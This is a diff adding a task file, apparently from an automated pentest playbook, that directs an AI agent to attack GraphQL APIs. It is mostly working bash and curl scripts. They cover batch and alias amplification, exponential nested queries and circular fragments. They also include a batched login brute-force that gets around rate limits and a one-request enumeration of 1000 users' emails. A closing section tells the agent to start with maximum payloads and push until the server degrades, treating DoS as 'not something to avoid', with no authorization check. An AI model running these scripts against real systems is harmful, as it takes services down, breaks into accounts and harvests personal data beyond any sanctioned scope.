@@ -1,0 +1,662 @@
+================================================================================
+TASK 68 · GRAPHQL DoS & RESOURCE EXHAUSTION
+================================================================================
+Covers testing_toolkit.txt Phase 8 Step 27 (Part 2)
+Denial of Service and resource exhaustion attacks on GraphQL APIs.
+
+OBJECTIVE:
+- Exploit query batching for amplification attacks
+- Test nested query depth for exponential resource consumption
+- Abuse field duplication and aliases
+- Test circular fragment references
+- Bypass query cost/complexity limits
+
+================================================================================
+INPUTS
+================================================================================
+outputs/graphql/endpoints.txt              ← GraphQL endpoints from Task 67
+outputs/graphql/introspection_raw.json     ← Schema for crafting attacks
+outputs/graphql/queries_list.txt           ← Available queries
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/graphql/
+├── dos_batching_results.txt       ← Batching abuse findings
+├── dos_depth_results.txt          ← Nested query attack results
+├── dos_alias_results.txt          ← Alias/field duplication results
+├── dos_fragment_results.txt       ← Circular fragment results
+├── cost_bypass_results.txt        ← Query cost bypass attempts
+└── dos_scan_log.txt               ← Full execution log
+
+================================================================================
+🧠 GRAPHQL DoS FUNDAMENTALS 🧠
+================================================================================
+
+───────────────────────────────────────
+Why GraphQL is DoS-Prone
+───────────────────────────────────────
+Unlike REST where server controls response size:
+- GraphQL lets CLIENT specify query complexity
+- Single request can trigger massive server-side work
+- No natural request size limits
+- Nested relationships create exponential growth
+
+ATTACK VECTORS:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Attack            │ Mechanism                    │ Impact                   │
+├───────────────────┼──────────────────────────────┼──────────────────────────┤
+│ Batching          │ 1000s of queries in 1 req   │ Bypass rate limits       │
+│ Nested Depth      │ Recursive relationships      │ Exponential DB queries   │
+│ Alias Abuse       │ Same field queried 1000x    │ Amplification            │
+│ Field Duplication │ Repeat expensive fields      │ CPU exhaustion           │
+│ Circular Fragments│ Infinite recursion           │ Stack overflow           │
+│ Directive Abuse   │ Overload with directives     │ Parser exhaustion        │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+================================================================================
+PHASE 1: QUERY BATCHING ABUSE
+================================================================================
+
+───────────────────────────────────────
+1.1 Understanding Batching
+───────────────────────────────────────
+# GraphQL allows multiple queries in single HTTP request
+# Server processes ALL queries, returns ALL results
+
+# Normal batching (2 queries):
+[
+  {"query": "{ user(id: 1) { name } }"},
+  {"query": "{ user(id: 2) { name } }"}
+]
+
+# Attack batching (1000 queries):
+# Bypasses per-request rate limiting!
+
+───────────────────────────────────────
+1.2 Test Batching Support
+───────────────────────────────────────
+# Simple batch test
+curl -s -X POST "https://target.com/graphql" \
+    -H "Content-Type: application/json" \
+    -d '[{"query":"{__typename}"},{"query":"{__typename}"}]'
+
+# If response is array → Batching supported!
+# [{"data":{"__typename":"Query"}},{"data":{"__typename":"Query"}}]
+
+───────────────────────────────────────
+1.3 Batching DoS Attack
+───────────────────────────────────────
+#!/bin/bash
+# graphql_batch_dos.sh
+
+TARGET="$1"
+BATCH_SIZE=${2:-100}
+
+echo "[*] Testing batch DoS with $BATCH_SIZE queries"
+
+# Generate batch payload
+BATCH="["
+for i in $(seq 1 $BATCH_SIZE); do
+    if [ $i -gt 1 ]; then BATCH+=","; fi
+    BATCH+="{\"query\":\"{__typename}\"}"
+done
+BATCH+="]"
+
+# Measure response time
+start_time=$(date +%s%3N)
+
+response=$(curl -s -X POST "$TARGET" \
+    -H "Content-Type: application/json" \
+    -d "$BATCH" \
+    --max-time 60)
+
+end_time=$(date +%s%3N)
+duration=$((end_time - start_time))
+
+echo "[*] Batch size: $BATCH_SIZE"
+echo "[*] Response time: ${duration}ms"
+
+# Check if all queries processed
+query_count=$(echo "$response" | grep -o "__typename" | wc -l)
+echo "[*] Queries processed: $query_count"
+
+if [ $query_count -eq $BATCH_SIZE ]; then
+    echo "[!] Full batch processed - DoS potential!"
+fi
+
+───────────────────────────────────────
+1.4 BatchQL Tool
+───────────────────────────────────────
+# Install BatchQL
+pip install batchql
+
+# Run batch attack
+batchql -e https://target.com/graphql -q '{__typename}' -b 1000
+
+# BatchQL features:
+# - Automatic batch size detection
+# - Rate limit bypass testing
+# - Response time analysis
+
+───────────────────────────────────────
+1.5 Batching for Rate Limit Bypass
+───────────────────────────────────────
+# If login has rate limit (5 attempts/minute):
+# Batch 100 login attempts in 1 request!
+
+BATCH="["
+for i in $(seq 1 100); do
+    if [ $i -gt 1 ]; then BATCH+=","; fi
+    BATCH+="{\"query\":\"mutation { login(email:\\\"test@test.com\\\", password:\\\"attempt$i\\\") { token } }\"}"
+done
+BATCH+="]"
+
+curl -s -X POST "https://target.com/graphql" \
+    -H "Content-Type: application/json" \
+    -d "$BATCH"
+
+# All 100 attempts processed as 1 HTTP request!
+
+================================================================================
+PHASE 2: NESTED QUERY DEPTH ATTACKS
+================================================================================
+
+───────────────────────────────────────
+2.1 Understanding Nested Depth
+───────────────────────────────────────
+# GraphQL relationships can be nested recursively
+# Each level multiplies database queries
+
+# Schema example:
+# User → friends → friends → friends → ...
+
+# Depth 1: 1 query
+{ user { name } }
+
+# Depth 2: 1 + N queries (N = number of friends)
+{ user { friends { name } } }
+
+# Depth 3: 1 + N + N*M queries (exponential!)
+{ user { friends { friends { name } } } }
+
+───────────────────────────────────────
+2.2 Identify Recursive Relationships
+───────────────────────────────────────
+# From introspection, find types that reference themselves
+
+# Common patterns:
+# User.friends → [User]
+# Comment.replies → [Comment]
+# Node.children → [Node]
+# Category.subcategories → [Category]
+
+# Parse schema for self-references
+cat outputs/graphql/introspection_raw.json | jq '
+    .data.__schema.types[] |
+    select(.fields != null) |
+    {
+        type: .name,
+        selfRef: [.fields[] | select(.type.name == .name or .type.ofType?.name == .name) | .name]
+    } |
+    select(.selfRef | length > 0)
+'
+
+───────────────────────────────────────
+2.3 Nested Depth Attack
+───────────────────────────────────────
+#!/bin/bash
+# graphql_depth_dos.sh
+
+TARGET="$1"
+FIELD="$2"      # e.g., "friends" or "replies"
+MAX_DEPTH=${3:-20}
+
+echo "[*] Testing nested depth attack"
+echo "[*] Field: $FIELD"
+
+for depth in $(seq 1 $MAX_DEPTH); do
+    # Build nested query
+    query="{ user { "
+    for i in $(seq 1 $depth); do
+        query+="$FIELD { "
+    done
+    query+="id "
+    for i in $(seq 1 $depth); do
+        query+="} "
+    done
+    query+="} }"
+    
+    start_time=$(date +%s%3N)
+    
+    response=$(curl -s -X POST "$TARGET" \
+        -H "Content-Type: application/json" \
+        -d "{\"query\":\"$query\"}" \
+        --max-time 30 2>&1)
+    
+    end_time=$(date +%s%3N)
+    duration=$((end_time - start_time))
+    
+    # Check for depth limit error
+    if echo "$response" | grep -qi "depth\|limit\|exceeded\|too deep"; then
+        echo "[*] Depth $depth: BLOCKED (limit reached)"
+        break
+    elif echo "$response" | grep -qi "timeout\|error"; then
+        echo "[!] Depth $depth: ${duration}ms - SERVER STRUGGLING!"
+    else
+        echo "[*] Depth $depth: ${duration}ms"
+    fi
+done
+
+───────────────────────────────────────
+2.4 Exponential Amplification Query
+───────────────────────────────────────
+# Combine nesting with multiple fields
+
+query {
+  users {           # 100 users
+    friends {       # Each has 100 friends = 10,000
+      friends {     # Each has 100 friends = 1,000,000
+        friends {   # Each has 100 friends = 100,000,000 !!
+          id
+          name
+          email
+        }
+      }
+    }
+  }
+}
+
+# This single query could trigger 100 million DB queries!
+
+================================================================================
+PHASE 3: ALIAS & FIELD DUPLICATION
+================================================================================
+
+───────────────────────────────────────
+3.1 Understanding Aliases
+───────────────────────────────────────
+# Aliases let you query same field multiple times
+# Each alias = separate resolver execution
+
+# Normal query:
+{ user(id: 1) { name } }
+
+# With aliases (same field, 3 executions):
+{
+  a: user(id: 1) { name }
+  b: user(id: 1) { name }
+  c: user(id: 1) { name }
+}
+
+───────────────────────────────────────
+3.2 Alias Amplification Attack
+───────────────────────────────────────
+#!/bin/bash
+# graphql_alias_dos.sh
+
+TARGET="$1"
+ALIAS_COUNT=${2:-1000}
+
+echo "[*] Testing alias amplification with $ALIAS_COUNT aliases"
+
+# Build query with many aliases
+query="{"
+for i in $(seq 1 $ALIAS_COUNT); do
+    query+="a$i: __typename "
+done
+query+="}"
+
+start_time=$(date +%s%3N)
+
+response=$(curl -s -X POST "$TARGET" \
+    -H "Content-Type: application/json" \
+    -d "{\"query\":\"$query\"}" \
+    --max-time 60)
+
+end_time=$(date +%s%3N)
+duration=$((end_time - start_time))
+
+echo "[*] Aliases: $ALIAS_COUNT"
+echo "[*] Response time: ${duration}ms"
+
+# Count results
+result_count=$(echo "$response" | grep -o "__typename" | wc -l)
+echo "[*] Results returned: $result_count"
+
+───────────────────────────────────────
+3.3 Expensive Field Duplication
+───────────────────────────────────────
+# Find and duplicate expensive fields (computed, aggregated)
+
+# Example: If "statistics" is expensive
+query {
+  a1: user(id: 1) { statistics { totalPosts totalLikes totalFollowers } }
+  a2: user(id: 1) { statistics { totalPosts totalLikes totalFollowers } }
+  a3: user(id: 1) { statistics { totalPosts totalLikes totalFollowers } }
+  # ... repeat 100 times
+}
+
+# Generate expensive field duplication
+#!/bin/bash
+EXPENSIVE_FIELD="statistics"
+COUNT=100
+
+query="{"
+for i in $(seq 1 $COUNT); do
+    query+="a$i: user(id: 1) { $EXPENSIVE_FIELD { totalPosts } } "
+done
+query+="}"
+
+curl -s -X POST "https://target.com/graphql" \
+    -H "Content-Type: application/json" \
+    -d "{\"query\":\"$query\"}"
+
+───────────────────────────────────────
+3.4 Alias-Based IDOR Enumeration
+───────────────────────────────────────
+# Aliases also enable mass IDOR in single request!
+
+query {
+  u1: user(id: 1) { email }
+  u2: user(id: 2) { email }
+  u3: user(id: 3) { email }
+  u4: user(id: 4) { email }
+  # ... enumerate 1000 users in 1 request
+}
+
+# Generate IDOR enumeration query
+#!/bin/bash
+query="{"
+for i in $(seq 1 1000); do
+    query+="u$i: user(id: $i) { id email } "
+done
+query+="}"
+
+# Single request, 1000 user lookups!
+
+================================================================================
+PHASE 4: FRAGMENT & DIRECTIVE ABUSE
+================================================================================
+
+───────────────────────────────────────
+4.1 Circular Fragment Reference
+───────────────────────────────────────
+# Fragments can reference each other → infinite loop
+
+# This SHOULD cause parser error, but buggy implementations crash:
+query {
+  user {
+    ...A
+  }
+}
+
+fragment A on User {
+  friends {
+    ...B
+  }
+}
+
+fragment B on User {
+  friends {
+    ...A
+  }
+}
+
+# Test circular fragment
+curl -s -X POST "https://target.com/graphql" \
+    -H "Content-Type: application/json" \
+    -d '{"query":"query { user { ...A } } fragment A on User { friends { ...B } } fragment B on User { friends { ...A } }"}'
+
+───────────────────────────────────────
+4.2 Fragment Spread Amplification
+───────────────────────────────────────
+# Spread same fragment many times
+
+query {
+  user {
+    ...UserFields
+    ...UserFields
+    ...UserFields
+    # Repeat 100 times
+  }
+}
+
+fragment UserFields on User {
+  id
+  name
+  email
+  profile { bio avatar }
+}
+
+───────────────────────────────────────
+4.3 Directive Overloading
+───────────────────────────────────────
+# Overload with directives
+
+query {
+  user @include(if: true) @skip(if: false) @deprecated {
+    name @include(if: true) @skip(if: false)
+    email @include(if: true) @skip(if: false)
+  }
+}
+
+# Generate directive spam
+curl -s -X POST "https://target.com/graphql" \
+    -H "Content-Type: application/json" \
+    -d '{"query":"{ user @include(if:true) @include(if:true) @include(if:true) { name } }"}'
+
+───────────────────────────────────────
+4.4 Variable Injection Overload
+───────────────────────────────────────
+# Large number of variables
+
+query Test($v1: ID, $v2: ID, $v3: ID, ... $v1000: ID) {
+  user(id: $v1) { name }
+}
+
+# With 1000 variables in request
+
+================================================================================
+PHASE 5: QUERY COST/COMPLEXITY BYPASS
+================================================================================
+
+───────────────────────────────────────
+5.1 Understanding Query Cost Analysis
+───────────────────────────────────────
+# Some GraphQL servers implement cost analysis:
+# - Each field has a "cost"
+# - Total query cost must be under limit
+# - Prevents expensive queries
+
+# Goal: Find ways to bypass cost limits
+
+───────────────────────────────────────
+5.2 Cost Bypass via Batching
+───────────────────────────────────────
+# If cost is per-query, batch multiple queries
+
+# Single query: cost 100 (at limit)
+# Batch of 10: cost 100 each = 1000 total (bypassed!)
+
+[
+  {"query": "{ expensiveQuery { ... } }"},
+  {"query": "{ expensiveQuery { ... } }"},
+  {"query": "{ expensiveQuery { ... } }"}
+]
+
+───────────────────────────────────────
+5.3 Cost Bypass via Aliases
+───────────────────────────────────────
+# If cost calculated incorrectly for aliases
+
+# Intended cost: 10
+{ user { name } }
+
+# Actual cost (buggy): still 10, but executes 100x
+{
+  a1: user { name }
+  a2: user { name }
+  # ... 100 times
+}
+
+───────────────────────────────────────
+5.4 Test Cost Limit
+───────────────────────────────────────
+#!/bin/bash
+# test_cost_limit.sh
+
+TARGET="$1"
+
+echo "[*] Testing query cost limits"
+
+# Incrementally increase query complexity
+for size in 10 50 100 500 1000; do
+    query="{"
+    for i in $(seq 1 $size); do
+        query+="a$i: __typename "
+    done
+    query+="}"
+    
+    response=$(curl -s -X POST "$TARGET" \
+        -H "Content-Type: application/json" \
+        -d "{\"query\":\"$query\"}")
+    
+    if echo "$response" | grep -qi "cost\|complexity\|limit\|exceeded"; then
+        echo "[*] Size $size: BLOCKED (cost limit)"
+        echo "$response" | jq '.errors[0].message' 2>/dev/null
+    else
+        echo "[+] Size $size: ALLOWED"
+    fi
+done
+
+================================================================================
+PHASE 6: COMPLETE DoS TESTING SCRIPT
+================================================================================
+
+#!/bin/bash
+# complete_graphql_dos.sh
+
+TARGET="$1"
+OUTPUT_DIR="outputs/graphql"
+mkdir -p "$OUTPUT_DIR"
+
+echo "═══════════════════════════════════════════════════════════════"
+echo " GraphQL DoS & Resource Exhaustion Testing"
+echo " Target: $TARGET"
+echo "═══════════════════════════════════════════════════════════════"
+
+# TEST 1: Batching
+echo ""
+echo "[TEST 1] Query Batching"
+echo "─────────────────────────"
+
+for batch_size in 10 100 500 1000; do
+    batch="["
+    for i in $(seq 1 $batch_size); do
+        [ $i -gt 1 ] && batch+=","
+        batch+="{\"query\":\"{__typename}\"}"
+    done
+    batch+="]"
+    
+    start=$(date +%s%3N)
+    response=$(curl -s -X POST "$TARGET" \
+        -H "Content-Type: application/json" \
+        -d "$batch" --max-time 30 2>&1)
+    end=$(date +%s%3N)
+    
+    if echo "$response" | grep -q "^\["; then
+        count=$(echo "$response" | grep -o "__typename" | wc -l)
+        echo "[+] Batch $batch_size: ${count} processed in $((end-start))ms"
+        echo "Batch $batch_size: SUCCESS ($count queries, $((end-start))ms)" >> "$OUTPUT_DIR/dos_batching_results.txt"
+    else
+        echo "[-] Batch $batch_size: BLOCKED"
+        echo "Batch $batch_size: BLOCKED" >> "$OUTPUT_DIR/dos_batching_results.txt"
+        break
+    fi
+done
+
+# TEST 2: Alias Amplification
+echo ""
+echo "[TEST 2] Alias Amplification"
+echo "─────────────────────────────"
+
+for alias_count in 100 500 1000 5000; do
+    query="{"
+    for i in $(seq 1 $alias_count); do
+        query+="a$i:__typename "
+    done
+    query+="}"
+    
+    start=$(date +%s%3N)
+    response=$(curl -s -X POST "$TARGET" \
+        -H "Content-Type: application/json" \
+        -d "{\"query\":\"$query\"}" --max-time 30 2>&1)
+    end=$(date +%s%3N)
+    
+    if echo "$response" | grep -qi "error\|limit\|exceeded"; then
+        echo "[-] $alias_count aliases: BLOCKED"
+        echo "Aliases $alias_count: BLOCKED" >> "$OUTPUT_DIR/dos_alias_results.txt"
+        break
+    else
+        echo "[+] $alias_count aliases: $((end-start))ms"
+        echo "Aliases $alias_count: SUCCESS ($((end-start))ms)" >> "$OUTPUT_DIR/dos_alias_results.txt"
+    fi
+done
+
+# TEST 3: Circular Fragment
+echo ""
+echo "[TEST 3] Circular Fragment"
+echo "─────────────────────────────"
+
+circular_query='{"query":"{ __typename ...A } fragment A on Query { __typename ...B } fragment B on Query { __typename ...A }"}'
+
+response=$(curl -s -X POST "$TARGET" \
+    -H "Content-Type: application/json" \
+    -d "$circular_query" --max-time 10 2>&1)
+
+if echo "$response" | grep -qi "circular\|cycle\|infinite\|recursion"; then
+    echo "[+] Circular fragments properly detected"
+    echo "Circular fragments: PROTECTED" >> "$OUTPUT_DIR/dos_fragment_results.txt"
+else
+    echo "[!] Circular fragment handling unclear"
+    echo "Circular fragments: UNCLEAR" >> "$OUTPUT_DIR/dos_fragment_results.txt"
+fi
+
+echo ""
+echo "[*] DoS testing complete. Results in $OUTPUT_DIR"
+
+================================================================================
+🧠 YOU ARE AN INTELLIGENT AGENT 🧠
+================================================================================
+
+ATTACK PRIORITY:
+────────────────
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Priority │ Attack                  │ Detection                             │
+├──────────┼─────────────────────────┼───────────────────────────────────────┤
+│ 1        │ Batching                │ Response time, batch rejection        │
+│ 2        │ Nested Depth            │ Server timeout, depth errors          │
+│ 3        │ Alias Amplification     │ Response time scaling                 │
+│ 4        │ Field Duplication       │ CPU usage indicators                  │
+│ 5        │ Circular Fragments      │ Parser errors, crashes                │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+AGGRESSIVE TESTING:
+────────────────────
+✓ Start with MAXIMUM payloads - find breaking points
+✓ Push until server shows degradation - that's the finding!
+✓ Document exact payload that causes impact
+✓ DoS = HIGH severity finding, not something to avoid
+✓ Full capability exploitation
+
+================================================================================
+SUCCESS CRITERIA
+================================================================================
+✓ Batching support tested with size limits
+✓ Nested depth limits identified
+✓ Alias/field duplication limits found
+✓ Circular fragment handling tested
+✓ Query cost/complexity limits tested
+✓ All DoS vectors documented with thresholds
+
